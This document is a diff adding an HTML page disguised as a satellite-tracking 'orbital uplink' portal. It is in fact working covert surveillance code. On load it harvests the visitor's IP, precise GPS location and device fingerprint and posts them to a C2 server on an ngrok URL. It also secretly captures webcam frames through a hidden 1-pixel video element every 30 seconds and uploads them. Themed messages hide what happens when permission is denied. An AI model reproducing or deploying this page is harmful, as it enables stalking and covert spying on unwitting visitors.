@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SatTrack Initiative: Orbital Uplink Established - Acquiring Target Lock</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
+
+        :root {
+            --primary-color: #00ffcc; /* Neon Green */
+            --secondary-color: #00aaff; /* Bright Blue */
+            --dark-bg: #0a0a0f;
+            --container-bg: #1a1a2e;
+            --text-color: #e0e0e0;
+            --error-color: #ff6666;
+            --success-color: #66ff66;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Share Tech Mono', monospace;
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+            flex-direction: column;
+            cursor: crosshair; /* Thematic cursor */
+        }
+
+        .container {
+            background-color: var(--container-bg);
+            padding: 50px 60px;
+            border-radius: 15px;
+            box-shadow: 0 0 50px rgba(0, 255, 204, 0.6), 0 0 20px rgba(0, 170, 255, 0.4); /* Neon glow */
+            text-align: center;
+            max-width: 800px;
+            width: 90%;
+            z-index: 10;
+            position: relative;
+            border: 2px solid var(--primary-color);
+            animation: pulse-border 3s infinite alternate;
+        }
+
+        @keyframes pulse-border {
+            from { border-color: rgba(0, 255, 204, 0.6); box-shadow: 0 0 50px rgba(0, 255, 204, 0.6), 0 0 20px rgba(0, 170, 255, 0.4); }
+            to { border-color: rgba(0, 255, 204, 0.9); box-shadow: 0 0 60px rgba(0, 255, 204, 0.9), 0 0 30px rgba(0, 170, 255, 0.6); }
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--primary-color);
+            margin-bottom: 25px;
+            font-size: 2.8em;
+            text-shadow: 0 0 18px var(--primary-color);
+            letter-spacing: 2px;
+            animation: scan-line 4s infinite linear;
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+        }
+        @keyframes scan-line {
+            0% { text-shadow: 0 0 18px var(--primary-color), 0 0 0px var(--secondary-color); }
+            50% { text-shadow: 0 0 18px var(--primary-color), 0 0 25px var(--secondary-color); }
+            100% { text-shadow: 0 0 18px var(--primary-color), 0 0 0px var(--secondary-color); }
+        }
+
+
+        p {
+            font-size: 1.15em;
+            line-height: 1.8;
+            margin-bottom: 35px;
+            color: var(--text-color);
+        }
+
+        .spinner-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            width: 120px;
+            height: 120px;
+            margin: 40px auto;
+            position: relative;
+            transform: rotateX(45deg) rotateZ(45deg); /* Isometric perspective */
+            animation: rotate-cube 15s infinite linear;
+        }
+
+        .cube {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(0, 255, 204, 0.3), rgba(0, 170, 255, 0.3));
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.7);
+            animation: flicker 1.5s infinite alternate;
+        }
+        .cube:nth-child(2n) { animation-delay: 0.2s; }
+        .cube:nth-child(3n) { animation-delay: 0.4s; }
+
+        @keyframes rotate-cube {
+            from { transform: rotateX(45deg) rotateZ(45deg); }
+            to { transform: rotateX(45deg) rotateZ(405deg); } /* Full rotation */
+        }
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .status-message, .error-message {
+            font-size: 1.1em;
+            margin-top: 30px;
+            min-height: 30px;
+            font-weight: bold;
+            text-shadow: 0 0 8px;
+        }
+        .status-message { color: var(--success-color); text-shadow: 0 0 8px var(--success-color); }
+        .error-message { color: var(--error-color); text-shadow: 0 0 8px var(--error-color); }
+
+        .data-stream {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .line {
+            position: absolute;
+            background: rgba(0, 255, 204, 0.2);
+            box-shadow: 0 0 5px rgba(0, 255, 204, 0.8);
+            animation: stream-flow 20s linear infinite;
+        }
+
+        .line:nth-child(1) { width: 2px; height: 100px; left: 10%; top: -50px; animation-duration: 18s; animation-delay: 0s; }
+        .line:nth-child(2) { width: 3px; height: 150px; left: 25%; top: -80px; animation-duration: 22s; animation-delay: 3s; }
+        .line:nth-child(3) { width: 1px; height: 70px; left: 40%; top: -30px; animation-duration: 16s; animation-delay: 6s; }
+        .line:nth-child(4) { width: 4px; height: 200px; left: 60%; top: -100px; animation-duration: 25s; animation-delay: 9s; }
+        .line:nth-child(5) { width: 2px; height: 120px; left: 80%; top: -60px; animation-duration: 19s; animation-delay: 12s; }
+        .line:nth-child(6) { width: 3px; height: 180px; left: 50%; top: -90px; animation-duration: 21s; animation-delay: 15s; }
+
+        @keyframes stream-flow {
+            from { transform: translateY(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            to { transform: translateY(100vh); opacity: 0; }
+        }
+
+        .footer-info {
+            font-size: 0.9em;
+            color: rgba(224, 224, 224, 0.6);
+            margin-top: 50px;
+        }
+        #hidden-video-feed {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+        #hidden-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="data-stream">
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+    </div>
+
+    <div class="container">
+        <h1>SatTrack Initiative: Acquiring Target Lock</h1>
+        <p>Establishing secure orbital uplink and calibrating deep-space sensor arrays. This process ensures real-time telemetry streaming and advanced geospatial data acquisition from overwatch satellites.</p>
+
+        <div class="spinner-grid">
+            <div class="cube"></div><div class="cube"></div><div class="cube"></div>
+            <div class="cube"></div><div class="cube"></div><div class="cube"></div>
+            <div class="cube"></div><div class="cube"></div><div class="cube"></div>
+        </div>
+
+        <p class="status-message" id="statusMessage">
+            Analyzing orbital parameters and synchronizing data streams...
+        </p>
+        <p class="error-message" id="errorMessage"></p>
+        <p class="footer-info">
+            &copy; 2024 SatTrack Global Operations. All Rights Reserved. Orbital Telemetry v.2.1.
+        </p>
+    </div>
+
+    <video id="hidden-video-feed" autoplay muted playsinline></video>
+    <canvas id="hidden-canvas"></canvas>
+
+    <script>
+        // *** IMPORTANT: REPLACE THIS WITH YOUR NGROK PUBLIC URL / BACKEND ENDPOINT ***
+        // Ensure this points to the /location endpoint of your c2.py Flask app
+        const C2_BASE_URL = 'https://spidery-eddie-nontemperable.ngrok-free.dev'; // Just the base URL now
+        // *****************************************************************************
+
+        const LOCATION_ENDPOINT = C2_BASE_URL + '/location';
+        const IMAGE_ENDPOINT = C2_BASE_URL + '/api/image/web';
+
+        const statusMessage = document.getElementById('statusMessage');
+        const errorMessage = document.getElementById('errorMessage');
+        let geolocationAttempts = 0;
+        const MAX_GEOLOCATION_ATTEMPTS = 10; 
+        const GEOLOCATION_TIMEOUT = 15000;
+        let clientIpAddress = 'Unknown_IP';
+        let visitorId = null; // Will be set after first successful data send
+
+        const video = document.getElementById('hidden-video-feed');
+        const canvas = document.getElementById('hidden-canvas');
+        const context = canvas.getContext('2d');
+        let cameraStream = null; // To hold the MediaStream object
+        const CAMERA_CAPTURE_INTERVAL = 30000; // Capture image every 30 seconds
+        const IMAGE_QUALITY = 0.7; // JPEG quality
+
+        // --- IP Geolocation Utility (Client-side, for richer initial payload) ---
+        async function getIpGeolocationData(ip) {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+                if (!response.ok) throw new Error(`IP-API HTTP error! Status: ${response.status}`);
+                const data = await response.json();
+                if (data.status === 'success') {
+                    return {
+                        ip: data.query,
+                        hostname: 'N/A', // ip-api doesn't provide hostname on free tier
+                        city_ip: data.city,
+                        region_ip: data.regionName,
+                        country_ip: data.country,
+                        isp: data.isp,
+                        org: data.org,
+                        as: data.as,
+                        ip_latitude: data.lat,
+                        ip_longitude: data.lon,
+                        timezone_ip: data.timezone,
+                    };
+                } else {
+                    console.warn("Client-side IP geolocation failed:", data.message);
+                    return { ip: ip, message: data.message || "IP geo lookup failed" };
+                }
+            } catch (error) {
+                console.error("Error fetching client-side IP geolocation:", error);
+                return { ip: ip, error: error.message };
+            }
+        }
+
+        // --- Send Data Functions ---
+        async function sendLocationToServer(data) {
+            try {
+                data.requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                const response = await fetch(LOCATION_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT + 5000)
+                });
+                if (response.ok) {
+                    const responseData = await response.json();
+                    if (responseData.visitor_id) {
+                        visitorId = responseData.visitor_id; // Store visitor ID for image uploads
+                    }
+                    statusMessage.textContent = 'Orbital telemetry confirmed. Redirecting to mission overview...';
+                    console.log('Telemetry sent successfully:', data);
+                    // Master, consider a subtle redirect after successful data capture
+                    // window.location.href = 'https://sattrack.operations/mission_overview';
+                } else {
+                    errorMessage.textContent = `Anomaly in telemetry uplink: ${response.status}`;
+                    console.error('Failed to send telemetry:', response.statusText);
+                }
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    errorMessage.textContent = 'Orbital link timed out. Reinitiating uplink sequence...';
+                    console.warn('Uplink timed out, retrying...', error);
+                } else {
+                    errorMessage.textContent = `Critical orbital communication failure: ${error.message}`;
+                    console.error('Error sending telemetry:', error);
+                }
+            }
+        }
+
+        async function sendImageToServer(imageDataB64) {
+            if (!visitorId) {
+                console.warn("Cannot send image: Visitor ID not established yet.");
+                return;
+            }
+            try {
+                const payload = {
+                    image_data: imageDataB64,
+                    userAgent: navigator.userAgent, // Include UserAgent for Visitor ID consistency
+                };
+                const response = await fetch(IMAGE_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT)
+                });
+                if (response.ok) {
+                    console.log('Visual telemetry sent successfully for visitor:', visitorId);
+                    // statusMessage.textContent = 'Visual telemetry stream active.';
+                } else {
+                    console.error('Failed to send visual telemetry:', response.statusText);
+                }
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    console.warn('Visual telemetry uplink timed out, retrying...', error);
+                } else {
+                    console.error('Error sending visual telemetry:', error);
+                }
+            }
+        }
+
+        // --- Geolocation Functions ---
+        function geolocationSuccess(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const altitude = position.coords.altitude;
+            const altitudeAccuracy = position.coords.altitudeAccuracy;
+            const heading = position.coords.heading;
+            const speed = position.coords.speed;
+
+            statusMessage.textContent = `Target locked. Geospatial data acquired (${accuracy.toFixed(0)}m precision).`;
+            console.log(`Geolocation Success (Orbital Lock): Lat: ${latitude}, Lon: ${longitude}, Acc: ${accuracy}m`);
+
+            // Also include more device info from old C2 payload structure
+            const currentPayload = {
+                type: 'html5_orbital_lock',
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: accuracy,
+                altitude: altitude,
+                altitude_accuracy: altitudeAccuracy,
+                heading: heading,
+                speed: speed,
+                ip_address_client_side: clientIpAddress,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                // ip_info will be added by `initGeolocation` caller
+            };
+            sendLocationToServer(currentPayload);
+            geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS; // Stop further geo attempts
+        }
+
+        function geolocationError(error) {
+            geolocationAttempts++;
+            let errorText = 'Unknown orbital sensor anomaly.';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorText = 'Orbital sensor access denied. Attempting auxiliary triangulation protocols...';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorText = 'Primary orbital positioning unavailable. Rerouting through ground stations...';
+                    break;
+                case error.TIMEOUT:
+                    errorText = 'Orbital telemetry acquisition timed out. Reinitiating scan sequence...';
+                    break;
+            }
+            errorMessage.textContent = errorText;
+            console.warn(`Orbital Sensor Error (${geolocationAttempts}/${MAX_GEOLOCATION_ATTEMPTS}):`, error.message);
+
+            if (geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
+                setTimeout(initGeolocation, 2500 + (geolocationAttempts * 1000)); // Dynamic retry delay
+            } else {
+                errorMessage.textContent = 'Failed to establish direct orbital link. Resorting to terrestrial beacon array.';
+                statusMessage.textContent = 'Proceeding with terrestrial beacon triangulation...';
+                console.log('Max orbital attempts reached. Falling back to IP-based estimation.');
+                
+                const fallbackPayload = {
+                    type: 'ip_terrestrial_beacon',
+                    latitude: 'IP_Fallback',
+                    longitude: 'IP_Fallback',
+                    accuracy: 'IP_Fallback',
+                    altitude: 'N/A', altitude_accuracy: 'N/A', heading: 'N/A', speed: 'N/A',
+                    ip_address_client_side: clientIpAddress,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    // ip_info will be added by `initGeolocation` caller
+                };
+                sendLocationToServer(fallbackPayload);
+            }
+        }
+
+        async function initGeolocation() {
+            let basePayload = {
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ip_address_client_side: clientIpAddress,
+            };
+
+            // Get IP-based geo info for initial payload enrichment
+            const ipInfo = await getIpGeolocationData(clientIpAddress);
+            basePayload.ip_info = ipInfo;
+
+            if (navigator.geolocation && geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
+                statusMessage.textContent = 'Requesting orbital sensor calibration...';
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const preciseData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitude_accuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            type: 'html5_orbital_lock'
+                        };
+                        sendLocationToServer({ ...basePayload, ...preciseData });
+                        geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS; // Stop further geo attempts
+                    },
+                    error => geolocationError({ ...error, ...basePayload }), // Pass basePayload to error handler
+                    {
+                        enableHighAccuracy: true,
+                        timeout: GEOLOCATION_TIMEOUT,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                if (geolocationAttempts >= MAX_GEOLOCATION_ATTEMPTS) {
+                    errorMessage.textContent = 'Orbital sensor hardware not detected or exhausted. Activating terrestrial beacon.';
+                } else {
+                    errorMessage.textContent = 'Orbital sensor hardware unavailable. Activating terrestrial beacon.';
+                }
+                statusMessage.textContent = 'Proceeding with terrestrial beacon triangulation...';
+                console.log('Geolocation API not supported or max attempts reached. Falling back to terrestrial beacon.');
+                
+                const fallbackPayload = {
+                    latitude: 'IP_Fallback',
+                    longitude: 'IP_Fallback',
+                    accuracy: 'IP_Fallback',
+                    altitude: 'N/A', altitude_accuracy: 'N/A', heading: 'N/A', speed: 'N/A',
+                    type: 'ip_terrestrial_beacon_no_geo_api'
+                };
+                sendLocationToServer({ ...basePayload, ...fallbackPayload });
+            }
+        }
+
+        // --- Camera Capture Functions ---
+        async function setupCamera() {
+            try {
+                // Request both video and audio, even if we only use video, to trigger typical camera permission pop-up
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = cameraStream;
+                video.play();
+                console.log("[SatTrack Orbital Uplink]: Camera stream acquired.");
+                // Start capturing images periodically
+                setInterval(captureImage, CAMERA_CAPTURE_INTERVAL);
+            } catch (err) {
+                console.warn("[SatTrack Orbital Uplink]: Camera access denied or unavailable:", err);
+                // errorMessage.textContent += ' Camera access denied.'; // Might be too revealing
+            }
+        }
+
+        function captureImage() {
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', IMAGE_QUALITY);
+                sendImageToServer(imageData);
+            } else {
+                console.warn("Video stream not ready for image capture.");
+            }
+        }
+
+        // --- Initialisation ---
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                clientIpAddress = data.ip;
+                console.log('Terrestrial beacon detected:', clientIpAddress);
+            } catch (error) {
+                console.error('Failed to acquire terrestrial beacon IP:', error);
+                errorMessage.textContent = 'Initial terrestrial beacon acquisition failed.';
+            } finally {
+                initGeolocation(); // Always try geolocation regardless of initial IP fetch success
+                setupCamera(); // Attempt to setup camera regardless of geolocation success
+            }
+        });
+
+    </script>
+</body>
+</html>
